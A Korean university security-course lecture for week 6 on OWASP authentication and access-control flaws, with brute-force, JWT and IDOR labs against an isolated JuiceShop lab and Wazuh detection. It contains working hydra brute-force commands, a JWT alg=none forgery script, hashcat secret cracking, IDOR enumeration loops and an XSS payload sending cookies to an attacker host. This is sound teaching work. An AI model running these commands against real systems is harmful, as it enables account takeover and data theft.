# Week 06 — OWASP A01 + A07 — 인증 + 접근제어

> **A01 Broken Access Control** + **A07 Identification & Authentication Failures**
> 는 OWASP Top 10 의 2 + 7 위 (2021 기준). 모던 web 의 가장 빈번한 약점. 인증
> (Authentication, 너 누구?) + 권한 부여 (Authorization, 너 무엇 할 수 있나?) 의
> 차이부터, brute force / JWT 변조 / IDOR / session hijacking 까지 본 주차에서
> 다룬다.

> **🛡️ 공격 lab 의 탐지 데이터 정책 (시리즈 공통)**
>
> 본 주차 lab 의 hydra brute 후 Wazuh 의 5710/5712 alert 카운트 가 *0* 이면 *공격
> 자체* 가 아닌 *탐지 측 결함* (Wazuh agent 미설치 / rsyslog forward 미설정 / 룰
> 비활성). 표준 절차 = (a) `ssh 6v6-siem 'sudo /var/ossec/bin/agent_control -lc'`
> 로 등록 agent 확인 → bastion (10.20.30.201) 미등록 시 (b) siem 에서
> `manage_agents -a -n bastion -i 10.20.30.201` + bastion 측 wazuh-agent 설치/등록
> → (c) 재 brute → alerts.json 검증.
>
> 시간 제약 시 fallback — `scripts/lab_fixture_inject.py` 의 `wazuh_alert` 합성
> (5710/5712 burst). 단 *공격 lab 의 학습 본질* 은 *직접 공격 + 직접 탐지* 이므로
> fixture 는 최후 수단. SOC 운영 과목 (secuops) 의 분석 lab 과 정책이 다름.

## 학습 목표

학생은 본 주차 종료 시 다음을 수행할 수 있어야 한다.

1. **인증 vs 권한 부여 (AuthN vs AuthZ)** 의 차이 + 4 인증 방식
2. **hydra / medusa / patator** brute force 도구 상세 + 50+ protocol
3. **JWT 보안 약점 5** (alg=none / weak secret / RS256 confusion / kid traversal /
   payload 평문)
4. **IDOR (Insecure Direct Object Reference)** 의 5 패턴 + 권한 검증 우회
5. **Session fixation / hijacking** + cookie 보안
6. **OAuth 2.0 + OIDC** 의 보안 (CSRF / open redirect / token leak)
7. **방어 표준** (MFA / rate limit / SSO / SAML / WebAuthn)
8. W06 R/B/P 1 사이클

## 강의 시간 배분 (3시간 40분)

| 시간      | 내용                                                                     | 유형 |
|-----------|--------------------------------------------------------------------------|------|
| 0:00–0:30 | 이론 — AuthN vs AuthZ + 4 인증 방식 (Basic / Digest / Bearer / Cookie)   | 강의 |
| 0:30–1:00 | 이론 — hydra / medusa / patator + 50+ protocol                          | 강의 |
| 1:00–1:10 | 휴식                                                                      | —    |
| 1:10–1:40 | 이론 — JWT 보안 약점 5                                                   | 강의 |
| 1:40–2:00 | 이론 — IDOR + Session fixation + OAuth 보안                              | 강의 |
| 2:00–2:30 | 실습 1, 2 — hydra SSH brute + HTTP form brute                            | 실습 |
| 2:30–2:40 | 휴식                                                                      | —    |
| 2:40–3:10 | 실습 3, 4 — JWT alg=none + IDOR                                          | 실습 |
| 3:10–3:30 | 실습 5 — R/B/P 보고서                                                    | 실습 |
| 3:30–3:40 | 정리 + W07 (SSRF / 파일업로드 / Path Traversal) 예고                     | 정리 |

---

## 1. AuthN vs AuthZ — 인증과 권한의 차이

### 1.1 정의

| 구분 | 정의 | 답해야 할 질문 | 예 |
|------|------|----------------|-----|
| **Authentication (AuthN)** | "너 누구?" | 사용자의 정체 확인 | login (ID/PW) |
| **Authorization (AuthZ)** | "너 무엇 할 수 있나?" | 권한 결정 | admin 권한 → /admin 접근 |

**순서**: AuthN → AuthZ. 인증 안 된 사용자는 권한 결정 무의미.

**OWASP A01 vs A07**:
- A01 Broken Access Control = AuthZ 실패 (예: IDOR — 인증은 됐으나 다른 사용자 데이터 접근)
- A07 Auth Failures = AuthN 실패 (예: 약한 비밀번호 brute force 성공)

### 1.2 4 인증 방식

#### 1.2.1 Basic Authentication (RFC 7617)

```
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
              base64(admin:password)
```

**약점**:
- base64 (암호화 아님) — TLS 없으면 평문 노출
- 모든 요청에 credential 전송 (replay 위험)
- logout 없음

**언제 사용**: 내부 API + 항상 HTTPS + IP whitelist 결합 시.

#### 1.2.2 Digest Authentication (RFC 7616)

```
Authorization: Digest username="admin", realm="...", nonce="...", uri="/", response="..."
```

**원리**: server 가 nonce 발급 → client 가 password+nonce hash 응답.
**장점**: 평문 password 미전송.
**약점**: 약한 hash (MD5) → brute 가능.
**현재**: 거의 안 씀 (Bearer 가 표준).

#### 1.2.3 Bearer Token (JWT / OAuth)

```
Authorization: Bearer eyJhbGciOiJIUzI1NiI...
```

**원리**: 첫 인증 후 token 발급 → 후속 요청에 token 으로 인증.
**장점**: stateless / 분산 친화 / token 자체에 정보.
**약점**: §3 의 5 약점.

#### 1.2.4 Session Cookie

```
Set-Cookie: PHPSESSID=abc123; HttpOnly; Secure; SameSite=Strict
```

**원리**: 첫 로그인 후 session ID 발급 → server DB lookup.
**장점**: 즉시 무효화 가능.
**약점**: server 측 저장 (확장 어려움), XSS 로 도용 (HttpOnly 미설정 시).

### 1.3 MFA (Multi-Factor Authentication)

```
1 요소: 알고 있는 것 (password)
2 요소: 가지고 있는 것 (OTP, hardware token, SMS)
3 요소: 본인인 것 (지문, 얼굴)
```

2FA / MFA 가 모던 표준. brute force 영향 거의 무력화.

---

## 2. Brute Force 도구 상세

### 2.1 hydra

```
역사:    2000 van Hauser / THC (The Hacker's Choice)
라이선스: AGPL
지원:    50+ protocol
언어:    C
```

#### 2.1.1 핵심 옵션

```bash
# 입력
-l user            # single username
-L users.txt       # username list
-p pass            # single password
-P pass.txt        # password list
-e nsr             # 추가 시도: null/same/reverse
                   # null: 빈 password
                   # same: user 와 same password
                   # reverse: user 역순

# 동시성
-t N               # thread 수 (default 16)
-T N               # connection 수 (network 기반)

# 동작
-f                 # 첫 성공 시 stop
-F                 # 모든 host 시도 후 stop
-V                 # verbose (모든 시도 표시)
-vV                # very verbose
-o output.txt      # 결과 파일
-s port            # 비표준 port
-S                 # SSL 사용 (https / smtps 등)

# 출력
-d                 # debug
```

#### 2.1.2 50+ Protocol

```
SSH / FTP / FTPS / TELNET / SMB / SMBNT / LDAP2 / LDAP3 /
HTTP-GET / HTTP-POST / HTTP-HEAD / HTTPS-GET / HTTPS-POST /
HTTP-GET-FORM / HTTP-POST-FORM / HTTPS-GET-FORM / HTTPS-POST-FORM /
HTTP-PROXY / SOCKS5 / VNC / VMauth / MS-SQL / MYSQL / POSTGRES /
ORACLE-LISTENER / REDIS / RDP / SAP-R3 / SIP / SNMP / SVN / CVS / IRC /
ICQ / FIREBIRD / NCP / NNTP / PCANYWHERE / PCNFS / POP3 / POP3S / TEAMSPEAK ...
```

#### 2.1.3 사용 예 5

```bash
# 1. SSH single user, password list
hydra -l ccc -P /usr/share/wordlists/rockyou.txt 10.20.30.201 ssh

# 2. SSH multi user
hydra -L users.txt -P pass.txt -t 4 -f 10.20.30.201 ssh

# 3. HTTP POST form
hydra -l admin -P pass.txt 10.20.30.1 http-post-form \
    "/login:user=^USER^&pass=^PASS^:Invalid login" \
    -H "Host: dvwa.6v6.lab"

# 4. HTTP GET form
hydra -L users -P pass target http-get-form "/?u=^USER^&p=^PASS^:F=invalid"

# 5. HTTPS basic auth
hydra -L users -P pass -S target https-get

# 6. MySQL
hydra -l root -P pass.txt -t 4 10.20.32.x mysql
```

### 2.2 medusa

```
역사:    2005 Foofus
라이선스: GPL
강점:    병렬 처리 (host 동시 + service 동시)
```

```bash
medusa -h target -u admin -P pass.txt -M ssh
medusa -H hosts.txt -U users.txt -P pass.txt -M ssh -F
# -F: 첫 성공 시 stop
```

### 2.3 patator

```
역사:    2012 Sebastien Macke
라이선스: GPL
강점:    Python 확장 + 모듈식 + 풍부한 모듈 (50+)
```

```bash
patator ssh_login host=target user=admin password=FILE0 0=pass.txt
patator http_fuzz url=http://target/login \
    method=POST \
    body='user=admin&pass=FILE0' \
    0=pass.txt \
    -x ignore:fgrep='Invalid login'
```

### 2.4 brute force vs 운영 측 대응

| Red 시도 | Blue 대응 |
|----------|-----------|
| hydra SSH burst | fail2ban / Wazuh 5710-5712 / Active Response |
| HTTP form burst | rate limit (nginx / HAProxy) + CAPTCHA |
| API token brute | API gateway 의 rate limit |
| MFA bypass | MFA 적용 + adaptive auth |

**운영 권장**: hydra 등을 막는 가장 강력한 방법 = MFA.

---

## 3. JWT 보안 약점 5

### 3.1 약점 1: `alg: none`

#### 원리

```
JWT header: {"alg":"none","typ":"JWT"}
        → server 가 signature 검증 안 함
        → attacker 가 임의 payload 변조 가능
```

#### 변조 절차

```bash
# 1. 정상 JWT 의 header 변경
ORIGINAL_HEADER='{"alg":"RS256","typ":"JWT"}'
FAKE_HEADER='{"alg":"none","typ":"JWT"}'

# 2. payload 의 user role 변경 (admin 으로)
FAKE_PAYLOAD='{"sub":"admin","role":"admin","iat":...}'

# 3. base64url 인코딩
H=$(echo -n "$FAKE_HEADER" | base64 -w0 | tr '+/' '-_' | tr -d '=')
P=$(echo -n "$FAKE_PAYLOAD" | base64 -w0 | tr '+/' '-_' | tr -d '=')

# 4. signature 비움 (alg=none 이라 검증 안 됨 기대)
FAKE_JWT="${H}.${P}."

# 5. 변조 JWT 로 인증 시도
curl -H "Authorization: Bearer $FAKE_JWT" target/api/...
```

#### 방어

```python
# JWT 라이브러리 의 strict alg 옵션
jwt.decode(token, key, algorithms=["HS256"])      # 'none' 거부
# algorithms 명시 + 'none' 불포함 = 안전
```

### 3.2 약점 2: 약한 secret (HS256 brute)

#### 원리

```
HS256 = HMAC-SHA256(base64(header) + "." + base64(payload), secret)
약한 secret ("secret123" / "password" / "your-256-bit-secret" default 등)
→ hashcat brute 분 단위 성공
```

#### Brute 절차

```bash
# 1. JWT 를 hashcat 형식으로
JWT="eyJhbGc..."
echo "$JWT" > /tmp/jwt.txt

# 2. hashcat mode 16500 (JWT HS256)
hashcat -m 16500 /tmp/jwt.txt /usr/share/wordlists/rockyou.txt

# 출력:
# eyJhbGc...:secret123     (← 발견!)

# 3. 발견된 secret 으로 임의 JWT 생성
python3 -c "
import jwt
token = jwt.encode({'sub':'admin','role':'admin'}, 'secret123', algorithm='HS256')
print(token)
"
```

#### 방어

- secret 길이 ≥ 256 bit (32 byte random)
- environment variable 또는 secret manager (Vault) 에 저장
- 정기 rotation

### 3.3 약점 3: RS256 / HS256 algorithm confusion

#### 원리

```
- 정상: RSA 공개키 검증 (alg=RS256)
- 공격: alg 을 HS256 으로 변경 + 공개키 로 signature 생성
         서버가 RS256 으로 검증할 때 HS256 으로 인식 → 공개키 자체가 secret 되어 검증 통과
```

#### 방어

```python
# 정확한 alg 만
jwt.decode(token, public_key, algorithms=["RS256"])  # HS256 거부
```

### 3.4 약점 4: kid header path traversal

#### 원리

```
JWT header: {"alg":"HS256","kid":"../../../tmp/key.txt"}

서버가 kid 의 파일 path 를 그대로 사용:
  key = read_file(kid)
  → /tmp/key.txt 의 내용을 secret 으로 사용
  → attacker 가 controllable 한 file 의 내용을 secret 으로 사용 (예: 빈 파일)
```

#### 방어

- kid 값 검증 (whitelist)
- DB lookup 또는 안전한 key store

### 3.5 약점 5: payload 평문 노출

#### 원리

```
JWT payload = base64url(JSON)
            = 누구나 디코드 가능
            = 암호화 아님
```

민감 데이터 (SSN / 신용카드) 를 payload 에 넣으면 노출.

#### 방어

- payload 에 ID / role 만 (민감 데이터 X)
- 필요 시 JWE (JSON Web Encryption) 사용

---

## 4. IDOR (Insecure Direct Object Reference)

### 4.1 정의

```
IDOR = URL 또는 form 의 ID parameter 가 권한 검증 없이 다른 사용자의 데이터 접근 가능
CWE-639: Authorization Bypass Through User-Controlled Key
```

### 4.2 5 패턴

#### 4.2.1 URL parameter ID

```
정상:  GET /api/users/1/orders   (사용자 1 본인)
공격:  GET /api/users/2/orders   (다른 사용자)
```

#### 4.2.2 Filename / Path

```
정상:  GET /download?file=user_1_invoice.pdf
공격:  GET /download?file=user_2_invoice.pdf
       또는 /download?file=../../etc/passwd  (path traversal)
```

#### 4.2.3 Form hidden field

```html
<form>
  <input type="hidden" name="user_id" value="1">  <!-- 사용자가 변조 가능 -->
  <input type="text" name="new_email">
  <button>Update</button>
</form>
```

#### 4.2.4 GraphQL / REST API ID

```graphql
query {
  user(id: 2) {     # 다른 사용자 ID
    email
    address
  }
}
```

#### 4.2.5 Indirect reference

```
정상:  GET /api/document/abc123  (random ID)
공격:  GET /api/document/xyz456  (다른 사용자의 random ID — 추측 또는 enumeration)
```

### 4.3 방어

```python
# 1. 권한 검증 (caller.id == requested_id)
@app.route('/api/users/<int:user_id>')
def get_user(user_id):
    if user_id != current_user.id and not current_user.is_admin:
        abort(403)
    return get_user_data(user_id)

# 2. UUID 대체 (random + 길이 길어 enumeration 어려움)
GET /api/document/550e8400-e29b-41d4-a716-446655440000

# 3. indirect reference map (server 측 매핑)
GET /api/orders/my-first    # server 가 user 별 매핑
```

---

## 5. Session 보안

### 5.1 Session Fixation

```
1. attacker 가 자기 session ID 획득 (정상 로그인)
2. attacker 가 victim 에게 link 전송: ?PHPSESSID=ATTACKER_ID
3. victim 이 link 클릭 → 그 session 으로 로그인
4. attacker 가 자기 session ID 로 victim 권한 사용
```

**방어**: 로그인 후 session ID regenerate.

### 5.2 Session Hijacking (XSS 결합)

```html
<!-- W05 XSS 페이로드 -->
<script>fetch('//attacker/'+document.cookie)</script>
```

**방어**: HttpOnly cookie (JS 의 document.cookie 접근 차단).

### 5.3 Session 보안 헤더

```
Set-Cookie: PHPSESSID=...; HttpOnly; Secure; SameSite=Strict; Max-Age=3600; Path=/
```

---

## 6. OAuth 2.0 + OIDC 보안

### 6.1 OAuth flow

```
1. user → app: 로그인 요청
2. app → user: redirect to Google
3. user → Google: 인증 (Google 의 credential)
4. Google → app: redirect with authorization code
5. app → Google: code 교환 → access token
6. app → Google: token 으로 user 정보 조회
```

### 6.2 OAuth 보안 약점 3

#### 6.2.1 redirect_uri 검증 미흡

```
정상:  https://app.com/callback
공격:  https://app.com.attacker.com/callback   (regex 매칭 회피)
       https://attacker.com#https://app.com   (fragment 회피)
```

#### 6.2.2 state parameter 미사용 (CSRF)

```
공격자가 자신의 authorization code 를 victim 에게 redirect
→ victim 이 attacker 계정으로 자동 로그인
state parameter (random nonce) 미검증 시 발생
```

#### 6.2.3 token 누출

```
- Referer 헤더에 token 포함 (URL fragment)
- log 에 token 기록 (server log)
- error response 에 token 노출
```

---

## 7. 방어 표준 5

### 7.1 MFA (Multi-Factor Authentication)

- TOTP (Time-based OTP) — Google Authenticator
- FIDO2 / WebAuthn (hardware key)
- SMS (deprecated — SIM swap 위험)
- Push notification

### 7.2 Rate Limiting

```nginx
limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;

location /login {
    limit_req zone=login burst=10;
    proxy_pass ...;
}
```

본 lab 의 fw HAProxy 에 추가 가능.

### 7.3 Strong Password Policy

```
- 최소 12 자
- 대문자 + 소문자 + 숫자 + 특수문자
- 알려진 leak 비밀번호 차단 (haveibeenpwned API)
- 정기 변경 (60-90일 — 단, 모던 NIST 는 강제 변경 비권장)
```

### 7.4 Account Lockout

```
5회 실패 → 15분 lock
재시도 시 CAPTCHA
정기 alert (1시간 N회 실패)
```

### 7.5 Audit Logging

```
- 모든 login 시도 (성공 / 실패)
- 비정상 활동 (다른 country / IP)
- privileged action (admin 권한)
```

Wazuh / Splunk / ELK 의 alert 통합.

---

## 8. ATT&CK 매핑

| Tactic | Technique | 본 주차 |
|--------|-----------|--------|
| TA0006 Credential Access | T1110.001 Password Guessing | hydra |
| | T1110.003 Password Spraying | hydra |
| | T1110.004 Credential Stuffing | (별도) |
| | T1212 Exploitation for Credential Access | JWT alg=none |
| TA0001 Initial Access | T1078 Valid Accounts | brute 성공 후 |
| | T1133 External Remote Services | SSH brute |
| TA0008 Lateral Movement | T1550 Application Access Token | JWT 변조 |
| OWASP A01 | Broken Access Control | IDOR |
| OWASP A07 | Auth Failures | brute / JWT 약점 |

---

## 9. R/B/P 시나리오 — 인증 공격 1 사이클

```mermaid
graph LR
    R1["🔴 Red Team<br/>1. hydra SSH brute"]
    R2["🔴 Red Team<br/>2. HTTP form brute"]
    R3["🔴 Red Team<br/>3. JWT alg=none 변조"]
    R4["🔴 Red Team<br/>4. IDOR /api/Users/1..N"]

    FW["🌐 fw nftables<br/>22 input chain<br/>+ rate limit"]
    WAF["🌐 web Apache+ModSec"]
    APP["🌐 application backend<br/>JWT verify<br/>권한 검증"]

    B1["🔵 Suricata<br/>ET SCAN SSH brute<br/>sid 2200xxx"]
    B2["🔵 Wazuh 5710<br/>SSH failed authentication"]
    B3["🔵 Wazuh 5712<br/>SSH brute force pattern"]
    B4["🔵 ModSec audit log<br/>(HTTP form brute 시)"]
    B5["🔵 application log<br/>(JWT verify 실패)"]

    BWZ["🔵 Wazuh alerts.json<br/>level 7-12 alert"]

    P1["🟣 Active Response<br/>fw drop 5분"]
    P2["🟣 MFA 권장<br/>모든 admin"]
    P3["🟣 rate limit<br/>HAProxy 5/min"]

    R1 -->|22/tcp brute| FW
    FW --> B1
    FW --> B2
    B2 --> B3
    R2 -->|/login POST| WAF
    WAF --> B4
    R3 -->|Bearer 변조| WAF
    WAF --> APP
    APP --> B5
    R4 -->|GET /api/Users/N| APP

    B1 --> BWZ
    B2 --> BWZ
    B3 --> BWZ
    B4 --> BWZ
    B5 --> BWZ

    BWZ --> P1
    BWZ --> P2
    BWZ --> P3
    P1 -.->|nft drop set| FW
    P2 -.->|app 측| APP
    P3 -.->|haproxy.cfg| FW

    style R1 fill:#f85149,color:#fff
    style R2 fill:#f85149,color:#fff
    style R3 fill:#f85149,color:#fff
    style R4 fill:#f85149,color:#fff
    style WAF fill:#3fb950,color:#fff
    style BWZ fill:#1f6feb,color:#fff
    style P1 fill:#bc8cff,color:#fff
    style P2 fill:#bc8cff,color:#fff
    style P3 fill:#bc8cff,color:#fff
```

---

## 10. 실습 1~5

### 실습 1 — hydra SSH brute force

```bash
# 학습용 작은 wordlist (실 wordlist 는 rockyou.txt 14M 비밀번호)
ssh 6v6-attacker '
echo "admin
ccc
root
test" > /tmp/users.txt

echo "ccc
admin
password
1
letmein
123456
qwerty" > /tmp/pass.txt

echo "=== hydra SSH brute (제한된 wordlist) ==="
timeout 30 hydra -L /tmp/users.txt -P /tmp/pass.txt \
    -t 1 \
    -f \
    10.20.30.201 ssh -s 22 \
    2>&1 | tail -10
'
```

**예상 결과**:
```
[22][ssh] host: 10.20.30.201 login: ccc password: ccc
1 of 1 target successfully completed
```

이는 학습 환경의 default credential (ccc/ccc).

**Blue 측 확인**:

```bash
ssh 6v6-siem '
echo "=== Wazuh 5710/5712 alerts ==="
sudo tail -50 /var/ossec/logs/alerts/alerts.json | \
    jq "select(.rule.id == \"5710\" or .rule.id == \"5712\")" 2>/dev/null | head
'
```

### 실습 2 — HTTP form brute (JuiceShop)

```bash
ssh 6v6-attacker '
# JuiceShop 의 admin 비번 시도 (admin123 이 포함된 wordlist)
echo "ccc
admin
password
admin123
123456
qwerty" > /tmp/pass.txt

echo "=== hydra HTTPS POST form brute ==="
timeout 30 hydra -l "admin@juice-sh.op" -P /tmp/pass.txt \
    10.20.30.1 \
    https-post-form \
    "/rest/user/login:email=^USER^&password=^PASS^:Invalid" \
    -H "Host: juice.6v6.lab" \
    -t 1 -f 2>&1 | tail -10
'
```

**참고**: ModSec 가 hydra 의 User-Agent 검출 → 일부 차단 가능. paranoia 2+ 시 더 강력.

### 실습 3 — JWT 디코드 + alg=none 변조

```bash
ssh 6v6-attacker '
# Step 1: 정상 JWT 받기
JWT=$(curl -s -X POST \
    -H "Host: juice.6v6.lab" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}" \
    http://10.20.30.1/rest/user/login | \
    jq -r ".authentication.token // empty")

echo "=== Step 1. 정상 JWT 첫 50자 ==="
echo "${JWT:0:50}..."

# Step 2: 디코드
echo ""
echo "=== Step 2. Header decode ==="
echo "$JWT" | cut -d. -f1 | base64 -d 2>/dev/null | jq

echo ""
echo "=== Step 3. Payload decode ==="
echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null | jq

# Step 4: alg=none 변조
echo ""
echo "=== Step 4. alg=none 변조 시도 ==="
H=$(echo -n "{\"alg\":\"none\",\"typ\":\"JWT\"}" | base64 -w0 | tr "+/" "-_" | tr -d "=")
P=$(echo -n "{\"sub\":\"admin\",\"role\":\"admin\",\"iat\":1700000000,\"exp\":9999999999}" | base64 -w0 | tr "+/" "-_" | tr -d "=")
FAKE="${H}.${P}."
echo "변조 JWT: $FAKE"

# Step 5: 변조 JWT 로 인증 시도
echo ""
echo "=== Step 5. 변조 JWT 인증 ==="
curl -s -o /dev/null -w "HTTP: %{http_code}\n" \
    -H "Authorization: Bearer $FAKE" \
    -H "Host: juice.6v6.lab" \
    http://10.20.30.1/rest/user/whoami

# 200 = alg=none 우회 성공 (취약)
# 401 = strict alg 적용 (안전)
'
```

### 실습 4 — IDOR 시도 (JuiceShop)

```bash
ssh 6v6-attacker '
echo "=== JuiceShop IDOR — /api/Users/1..5 ==="

# 정상 user (admin 로그인 cookie 또는 JWT 사용)
# 인증 없이 시도
for id in 1 2 3 4 5 6 7 8 9 10; do
    code=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "Host: juice.6v6.lab" \
        "http://10.20.30.1/api/Users/$id")
    echo "User $id: $code"
done

echo ""
echo "=== 응답 내용 분석 (user 1) ==="
curl -s -H "Host: juice.6v6.lab" "http://10.20.30.1/api/Users/1" | jq

echo ""
echo "=== /api/BasketItems/N (다른 user 의 장바구니) ==="
for id in 1 2 3; do
    code=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "Host: juice.6v6.lab" \
        "http://10.20.30.1/api/BasketItems/$id")
    echo "Basket $id: $code"
done
'
```

**예상 결과**:
- 일부 endpoint 가 200 → IDOR 취약 (인증 없이 다른 user 데이터 접근)
- 일부 endpoint 가 401/403 → 정상 (인증 또는 권한 검증 적용)

### 실습 5 — R/B/P 보고서

```bash
# Red 측 history
echo "=== Red 측 (history) ==="
history | grep -E "hydra|curl.*jwt|curl.*Users" | tail -10

# Blue 측 — SSH brute 의 Wazuh detection
ssh 6v6-siem '
echo "=== Wazuh SSH brute (rule 5710/5712) ==="
sudo tail -100 /var/ossec/logs/alerts/alerts.json | \
    jq "select(.rule.id == \"5710\" or .rule.id == \"5712\")" 2>/dev/null | head -5

echo ""
echo "=== Wazuh authentication failure 통계 (최근 100) ==="
sudo tail -200 /var/ossec/logs/alerts/alerts.json | \
    jq -r "select(.rule.groups[]? == \"authentication_failures\") | .rule.id" 2>/dev/null | sort | uniq -c
'

# Blue 측 — ModSec 의 hydra UA detection
ssh 6v6-web '
echo "=== ModSec 의 brute UA 감지 ==="
sudo grep -i "hydra\|brute" /var/log/apache2/modsec_audit.log 2>/dev/null | head -5
'
```

**R/B/P 보고서**:

```markdown
# W06 R/B/P 보고서 — 인증·접근제어

## Red 측
- hydra SSH brute (4 user × 7 pass = 28 시도) → 1 성공 (ccc/ccc)
- HTTP form brute → 일부 차단 (ModSec) + 일부 성공 (admin@juice-sh.op / admin123)
- JWT alg=none 변조 → 200 (취약) 또는 401 (안전) — JuiceShop 결과 분석
- IDOR /api/Users/N → 10 시도, 일부 200 (취약 endpoint 발견)

## Blue 측 Coverage
| Red 시도 | Blue 도구 | rule ID |
| SSH brute | Wazuh agent (sshd) | 5710, 5712 |
| HTTP form brute | Wazuh (web agent) | 31115 (Apache 4xx) |
| JWT 변조 | (application 측 — 도구 미통합) | (gap) |
| IDOR | (application 측) | (gap) |

총 Coverage: 50% (50% 는 application 측 detection 필요)

## Purple 측 권장
1. Wazuh Active Response: 5712 시 fw nft drop 5분
2. MFA 적용 (TOTP / WebAuthn) — brute 의 가장 강력 방어
3. rate limit (HAProxy 또는 nginx) — 분당 5 회 시도
4. JWT strict alg whitelist
5. application 측 audit logging → Wazuh ingest
6. IDOR 방어: UUID + 권한 검증 미들웨어
```

---

## 11. 한국 사례 + 표준 매핑

### 11.1 KISA 인증 침해 사례

대부분 KISA 보고서가 다음 패턴:
- SQLi 또는 weak credentials → 첫 진입
- 권한 상승 → 다른 user 데이터 접근 (IDOR)
- 데이터 유출

본 주차 학습 후 이 패턴 분석 가능.

### 11.2 ISMS-P 2.5 (사용자 인증)

본 주차의 모든 detection 이 본 통제 입증.

### 11.3 NIST 800-63B (Digital Identity Guidelines)

표준 권장:
- 비밀번호 길이 ≥ 8 (단, 12+ 권장)
- 정기 변경 비권장 (오히려 weak password 야기)
- 알려진 leak 차단
- MFA AAL2 (소유 + 지식 또는 생체)

---

## 11.5 인증·접근제어 — Windows 측의 추가 표면 (W03 secuops 위빙)

본 주차의 인증·접근제어는 웹 애플리케이션 위주다 (OWASP A01/A07). Windows 사용자 PC 가 들어오면서
**OS 수준의 인증** 도 공격 표면에 들어왔다.

### Windows 인증의 핵심 표면

| 표면 | 공격 패턴 | Blue 측 단서 |
|------|----------|--------------|
| 로컬 로그온 | brute force / pass-the-hash | Security 4625 (실패) / 4624 LogonType 3 (네트워크) |
| RDP 3389 | password spray | Security 4625 + EID 4624 LogonType 10 |
| SMB null session | 익명 enum 시도 | Security 4624 LogonType 3 anonymous |
| WinRM 5985 | PowerShell remoting brute | Security 4625 + Sysmon EID 1 (winrshost) |

### 공격 → Blue 흔적의 1대1 매핑

본 강의는 Red 의 시각이지만, 매번 **그 공격이 Blue 의 어디에 잡히는지** 도 함께 봐 둔다. Windows
인증 공격은 거의 항상 Security 채널 4624/4625 로 흘러가며, 그 추적은 SOC W12 (내부 위협) 의 핵심
주제다.

> 본 주차의 OWASP A01/A07 은 웹 인증 — 정작 우리 6v6 의 핵심 자격증명 흐름 중 하나는 Windows
> 사용자 PC 의 로그온이다. Red 가 인증 표면을 모두 본다는 의미에서, 두 시각을 같이 학습한다.

---

## 12. 과제

### A. brute force 보고서 (필수, 40점)

hydra SSH + HTTP form + 결과 분석 + Wazuh detection 매핑.

### B. JWT 약점 5 분석 (심화, 30점)

JuiceShop 의 JWT 의 5 약점 (alg=none / weak secret / RS256 confusion / kid /
payload) 각각 시도 + 결과.

### C. IDOR 매트릭스 (정성, 30점)

JuiceShop 의 10+ endpoint × IDOR 시도 표 + 발견 endpoint + 권한 검증 권장.

---

## 13. 평가 기준

| 항목 | 비중 |
|------|------|
| brute force (A) | 40% |
| JWT 분석 (B) | 30% |
| IDOR (C) | 30% |

---

## 14. 핵심 정리 (10 줄)

1. **AuthN vs AuthZ** — 인증과 권한, A01 / A07 의 핵심 차이
2. **4 인증 방식** — Basic / Digest / Bearer / Cookie + MFA
3. **hydra / medusa / patator** — 50+ protocol brute force
4. **JWT 5 약점** — alg=none / weak secret / RS256 confusion / kid / payload 평문
5. **IDOR 5 패턴** — URL ID / filename / hidden field / GraphQL / indirect
6. **Session 보안** — fixation / hijacking / HttpOnly+Secure+SameSite
7. **OAuth 보안** — redirect_uri / state / token 누출
8. **방어 5 표준** — MFA / rate limit / strong password / lockout / audit
9. **W06 R/B/P** — 4 Red 시도 → Wazuh 5710/5712 + ModSec + application gap
10. **W07 (SSRF/파일업로드/Path)** 다음 주차
